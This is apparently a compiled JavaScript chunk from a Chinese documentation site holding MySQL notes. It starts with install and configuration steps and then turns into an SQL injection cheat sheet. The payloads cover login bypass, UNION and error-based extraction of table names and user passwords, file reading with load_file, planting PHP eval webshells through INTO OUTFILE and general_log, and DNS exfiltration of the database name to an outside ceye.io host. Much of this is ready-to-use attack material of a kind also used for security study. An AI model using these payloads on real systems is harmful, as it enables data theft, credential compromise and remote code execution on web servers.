import{_ as t,n as e,p as o,q as c,s,R as n,t as l,Y as a}from"./framework-cfcd8ab0.js";const k={},u=s("h2",{id:"下载",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#下载","aria-hidden":"true"},"#"),n(" 下载")],-1),r={href:"https://dev.mysql.com/downloads/mysql/",target:"_blank",rel:"noopener noreferrer"},i=a(`<h2 id="初始化" tabindex="-1"><a class="header-anchor" href="#初始化" aria-hidden="true">#</a> 初始化</h2><p>在根目录下创建文件<code>my.ini</code>。</p><div class="language-ini" data-ext="ini"><pre class="language-ini"><code><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">client</span><span class="token punctuation">]</span></span>
<span class="token comment"># 设置mysql客户端默认字符集</span>
<span class="token key attr-name">default-character-set</span><span class="token punctuation">=</span><span class="token value attr-value">utf8</span>
 
<span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">mysqld</span><span class="token punctuation">]</span></span>
<span class="token comment"># 设置3306端口</span>
<span class="token key attr-name">port</span> <span class="token punctuation">=</span> <span class="token value attr-value">3306</span>
<span class="token comment"># 设置mysql的安装目录</span>
<span class="token key attr-name">basedir</span><span class="token punctuation">=</span><span class="token value attr-value">D:\\\\MySQL\\\\mysql_5.7.40</span>
<span class="token comment"># 设置 mysql数据库的数据的存放目录，MySQL 8+ 不需要以下配置，系统自己生成即可，否则有可能报错</span>
<span class="token key attr-name">datadir</span><span class="token punctuation">=</span><span class="token value attr-value">D:\\\\MySQL\\\\mysql_5.7.40\\\\sqldata</span>
<span class="token comment"># 允许最大连接数</span>
<span class="token key attr-name">max_connections</span><span class="token punctuation">=</span><span class="token value attr-value">20</span>
<span class="token comment"># 服务端使用的字符集默认为8比特编码的latin1字符集</span>
<span class="token key attr-name">character-set-server</span><span class="token punctuation">=</span><span class="token value attr-value">utf8</span>
<span class="token comment"># 创建新表时将使用的默认存储引擎</span>
<span class="token key attr-name">default-storage-engine</span><span class="token punctuation">=</span><span class="token value attr-value">INNODB</span>
<span class="token comment"># 添加配置</span>
<span class="token key attr-name">explicit_defaults_for_timestamp</span><span class="token punctuation">=</span><span class="token value attr-value">true</span>
</code></pre></div><p>初始化数据库：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>mysqld <span class="token parameter variable">--initialize</span> <span class="token parameter variable">--console</span> <span class="token comment"># 初始化数据库</span>
</code></pre></div><h2 id="安装" tabindex="-1"><a class="header-anchor" href="#安装" aria-hidden="true">#</a> 安装</h2><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>mysqld <span class="token function">install</span> <span class="token comment"># 安装数据库</span>
</code></pre></div>`,7),d=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"提示"),s("p",null,"记得将 mysql 加入环境变量中。")],-1),m=a(`<h2 id="启动" tabindex="-1"><a class="header-anchor" href="#启动" aria-hidden="true">#</a> 启动</h2><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>net start mysql <span class="token comment"># 启动 mysql 服务</span>
net stop mysql <span class="token comment"># 停止 mysql 服务</span>
</code></pre></div><h2 id="修改密码" tabindex="-1"><a class="header-anchor" href="#修改密码" aria-hidden="true">#</a> 修改密码</h2><p>该方法适用于<code>5.7.x</code>版本。</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>mysql<span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> passowrd <span class="token keyword">for</span> root@localhost <span class="token operator">=</span> password<span class="token punctuation">(</span><span class="token string">&#39;lol111lol&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 将 root 密码修改成 &#39;lol111lol&#39;</span>
</code></pre></div><h2 id="基础" tabindex="-1"><a class="header-anchor" href="#基础" aria-hidden="true">#</a> 基础</h2><h3 id="information-schema" tabindex="-1"><a class="header-anchor" href="#information-schema" aria-hidden="true">#</a> information_schema</h3><p>MySQL 中系统自带数据库，其中有三张表格，分别是<code>SCHEMATA</code>、<code>TABLES</code>、<code>COLUMNS</code>。</p><ul><li>SCHEMATA</li></ul><p>提供了当前 mysql 实例中所有数据库信息，show databases 的结果就是取自该表。</p><ul><li>TABLES</li></ul><p>提供了关于数据库中的表的信息。</p><ul><li>COLUMNS</li></ul><p>提供了表中的列信息，详细表述了某张表的所有列以及每个列的信息。</p><table><thead><tr><th style="text-align:left;">表名</th><th style="text-align:left;">字段名</th><th style="text-align:left;">说明</th></tr></thead><tbody><tr><td style="text-align:left;"><code>schemata</code></td><td style="text-align:left;">schema_name</td><td style="text-align:left;"><strong>所有数据库的名字</strong></td></tr><tr><td style="text-align:left;"><code>tables</code></td><td style="text-align:left;">table_schema</td><td style="text-align:left;"><strong>表所属数据库的名字</strong></td></tr><tr><td style="text-align:left;"></td><td style="text-align:left;">table_name</td><td style="text-align:left;"><strong>表的名字</strong></td></tr><tr><td style="text-align:left;"><code>columns</code></td><td style="text-align:left;">table_schema</td><td style="text-align:left;"><strong>字段所属数据库的名字</strong></td></tr><tr><td style="text-align:left;"></td><td style="text-align:left;">table_name</td><td style="text-align:left;"><strong>字段所属表的名字</strong></td></tr><tr><td style="text-align:left;"></td><td style="text-align:left;">column_name</td><td style="text-align:left;"><strong>字段的名字</strong></td></tr></tbody></table><h2 id="常用函数" tabindex="-1"><a class="header-anchor" href="#常用函数" aria-hidden="true">#</a> 常用函数</h2><ul><li>获取系统信息</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment"># 当前用户名。</span>
<span class="token keyword">system_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 当前的用户名和主机名。</span>
<span class="token keyword">session_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment"># 连接数据库的用户名。</span>
@<span class="token variable">@basedir</span>    <span class="token comment"># mysql 安装路径。</span>
@<span class="token variable">@datadir</span>    <span class="token comment"># 数据库路径。</span>
version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 返回当前数据库的版本信息。</span>
@<span class="token variable">@version_compile_os</span>	<span class="token comment"># 操作系统版本。</span>
</code></pre></div><ul><li>字符串连接函数</li></ul><p><code>concat</code> <code>concat_ws</code> <code>group_concat</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span><span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
<span class="token keyword">select</span> concat_ws<span class="token punctuation">(</span><span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
<span class="token keyword">select</span> group_concat<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
</code></pre></div><ul><li>字符串操作函数</li></ul><p><code>substr</code> <code>mid</code> <code>left</code> <code>right</code> <code>locate</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># substr(str,pos,len)，str--&gt;字符串，pos--&gt;截取位置，从1开始，len--&gt;截取长度；limit表示从记录中第n个开始（n&gt;=0)，取m条记录</span>
<span class="token keyword">select</span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token string">&#39;martin&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># mid(str,pos,len)，str--&gt;字符串，pos--&gt;截取位置，从1开始，len--&gt;截取长度</span>
<span class="token keyword">select</span> <span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">&#39;martin&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># left(str,len)，str--&gt;字符串，len--&gt;长度，从左开始截取长度为len的字符串</span>
<span class="token keyword">select</span> <span class="token keyword">right</span><span class="token punctuation">(</span><span class="token string">&#39;martin&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># right(str,len)，str--&gt;字符串，len--&gt;长度，从右开始截取长度为len的字符串</span>
<span class="token keyword">select</span> locate<span class="token punctuation">(</span><span class="token string">&#39;security&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;1234security&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 返回第一个字符串在第二个字符串首次出现的位置</span>
<span class="token keyword">select</span> strcmp<span class="token punctuation">(</span><span class="token string">&#39;abc&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;abc&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 比较两个字符串是否相等，相等返回0，str1&gt;str2返回1，str1&lt;str2返回-1</span>
</code></pre></div><ul><li>返回指定 ASCII 字符对应的值</li></ul><p><code>ascii</code> <code>ord</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> ord<span class="token punctuation">(</span><span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>返回指定数字对应的 ASCII 码</li></ul><p><code>char</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span>
</code></pre></div><ul><li>计算相关</li></ul><p><code>length</code> <code>count</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 计算数据库名长度</span>
<span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
</code></pre></div><ul><li>时间相关</li></ul><p><code>sleep</code> <code>if</code> <code>benchmark</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 睡眠5秒</span>
<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>
<span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>locate<span class="token punctuation">(</span><span class="token string">&#39;s&#39;</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># if(expr1,expr2,expr3)</span>
<span class="token keyword">select</span> benchmark<span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">,</span>sha<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># benchmark(loop_count,expr)，loop_count 表示循环次数，expr 执行的表达式</span>
<span class="token keyword">select</span> get_lock<span class="token punctuation">(</span><span class="token string">&#39;test&#39;</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># get_lock(lock_name,timeout)，lock_name 表示锁名，timeout 表示超时时间</span>
</code></pre></div><ul><li>注释方法</li></ul><p><code>#</code> <code>--+</code> <code>/* */</code> <code>/*! */</code> <code>/*!50000 */</code> mysql5 通用 带版本内联注释</p><h2 id="注入语句" tabindex="-1"><a class="header-anchor" href="#注入语句" aria-hidden="true">#</a> 注入语句</h2><h3 id="万能密码" tabindex="-1"><a class="header-anchor" href="#万能密码" aria-hidden="true">#</a> 万能密码</h3><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;admin&#39;</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span>
<span class="token string">&#39;admin&#39;</span> <span class="token operator">or</span> <span class="token string">&#39;a&#39;</span><span class="token operator">=</span><span class="token string">&#39;a&#39;</span> <span class="token operator">or</span> <span class="token string">&#39;a&#39;</span><span class="token operator">=</span>&#39;a
</code></pre></div><h3 id="union注入" tabindex="-1"><a class="header-anchor" href="#union注入" aria-hidden="true">#</a> UNION注入</h3><ul><li>获取表名</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>
</code></pre></div><ul><li>获取字段名</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">&#39;users&#39;</span> <span class="token operator">%</span><span class="token number">23</span>
</code></pre></div><ul><li>获取字段对应的值</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token operator">%</span><span class="token number">23</span>
</code></pre></div><h3 id="报错注入" tabindex="-1"><a class="header-anchor" href="#报错注入" aria-hidden="true">#</a> 报错注入</h3><h4 id="updataxml" tabindex="-1"><a class="header-anchor" href="#updataxml" aria-hidden="true">#</a> updataxml：</h4><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>UPDATEXML <span class="token punctuation">(</span>XML_document<span class="token punctuation">,</span> XPath_string<span class="token punctuation">,</span> new_value<span class="token punctuation">)</span> 改变文档中符合条件的节点的值。
XML_document：String格式，为XML文档对象的名称。
XPath_string ：Xpath格式的字符串。
new_value：String格式，替换查找到的符合条件的数据。
</code></pre></div><ul><li>获取表名</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre></div><ul><li>获取字段名</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">&#39;emails&#39;</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+ </span>
</code></pre></div><h4 id="extractvalue" tabindex="-1"><a class="header-anchor" href="#extractvalue" aria-hidden="true">#</a> extractvalue：</h4><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>Extractvalue<span class="token punctuation">(</span>xml_frag<span class="token punctuation">,</span> xpath_expr<span class="token punctuation">)</span> 函数使用XPath表示法从XML字符串中提取值。
xml_frag: 目标xml文档。
xpath_expr: 利用Xpath路径法表示的查找路径。
</code></pre></div><ul><li>获取表名</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre></div><ul><li>获取字段名</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">&#39;emails&#39;</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+ </span>
</code></pre></div><h4 id="floor" tabindex="-1"><a class="header-anchor" href="#floor" aria-hidden="true">#</a> floor：</h4><blockquote><p>floor(x) 函数，向下取整,返回一个不大于 x 的值。</p></blockquote><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre></div><h3 id="写文件" tabindex="-1"><a class="header-anchor" href="#写文件" aria-hidden="true">#</a> 写文件</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> root 权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 网站绝对路径。</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&quot;&lt;?php @eval($_GET[x]);?&gt;&quot;</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&#39;C:/Inetpub/wwwroot/cc.php&#39;</span>
</code></pre></div><h3 id="读文件" tabindex="-1"><a class="header-anchor" href="#读文件" aria-hidden="true">#</a> 读文件</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> root 权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> mysql.ini 中 secure_file_pri 为空，（在 Linux 下为 my.cnf，目录是<code>/etc/my.cnf</code>）。</li></ul><p>读取 <code>secure_file_priv</code> 配置：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">&quot;secure_file_priv&quot;</span>
</code></pre></div><table><thead><tr><th style="text-align:left;">值</th><th style="text-align:left;">说明</th></tr></thead><tbody><tr><td style="text-align:left;"><code>null</code></td><td style="text-align:left;">不允许导入导出</td></tr><tr><td style="text-align:left;"><code>/tmp</code></td><td style="text-align:left;">只能在/tmp目录下导入导出</td></tr><tr><td style="text-align:left;"><code>空</code></td><td style="text-align:left;">允许导入导出</td></tr></tbody></table><p>写文件的时候还需要看 php.ini 里面 gpc 是否开启看，开启的情况下，特殊字符都会被转义。</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">&#39;c:\\\\window\\\\win.ini&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">&#39;c:/boot.ini&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token number">0x633a2f626f6f742e696e69</span><span class="token punctuation">)</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">&#39;//ecma.io/1.txt&#39;</span><span class="token punctuation">)</span> <span class="token comment"># smb 协议。</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">&#39;\\\\\\\\ecma.io\\\\1.txt&#39;</span><span class="token punctuation">)</span> <span class="token comment"># 可用于 DNS 隧道。</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 可以列出 FreeBSD，Sunos 系统的根目录，char(47) 就是 &#39;/&#39;。</span>
</code></pre></div><h3 id="写一句话木马" tabindex="-1"><a class="header-anchor" href="#写一句话木马" aria-hidden="true">#</a> 写一句话木马</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> root 权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 网站绝对路径。</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;?php phpinfo()?&gt;&#39;</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&quot;E\\\\phpStudy\\\\PHPTutoral\\\\www\\\\1.php&quot;</span> <span class="token comment">--+</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;?php phpinfo()?&gt;&#39;</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">&quot;E\\\\phpStudy\\\\PHPTutoral\\\\www\\\\1.php&quot;</span> <span class="token comment">--+</span>
</code></pre></div><p><em>outfile</em>和<em>dumpfile</em>的区别：</p><p><code>outfile</code> 后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径,但是值的部分可以是 16 进制。在使用 outfile 时,文件中一行的末尾会自动换行,且可以导出全部数据,同时如果文本中存在 \\n 等字符,会自动转义成 \\n,也就是会多加一个 \\。outfile 函数可以导出多行，而 <code>dumpfile</code> 只能导出一行数据；outfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式。而使用 dumpfile 时,一行的末尾不会换行且只能导出部分数据（这里比较数据比较少,没有体现出来）；但 dumpfile 不会自动对文件内容进行转义,而是原意写入（这就是为什么我们平时 UDF 提权时使用 dumpfile 来写入的原因）。</p><h3 id="堆叠注入写木马" tabindex="-1"><a class="header-anchor" href="#堆叠注入写木马" aria-hidden="true">#</a> 堆叠注入写木马</h3><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token comment"># 主要利用 mysql 日志来写 shell。</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token string">&quot;ON&quot;</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">&#39;C:/wamp64/www/ma.php&#39;</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="dnslog外带查询" tabindex="-1"><a class="header-anchor" href="#dnslog外带查询" aria-hidden="true">#</a> DNSlog外带查询</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> root 权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> mysql.ini 中 secure_file_priv 必须为空。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> Windows 系统。</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">&#39;\\\\\\\\&#39;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&#39;.27epx0.ceye.io\\\\abc&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+ # 使用 Windows 下的 UNC 路径。</span>
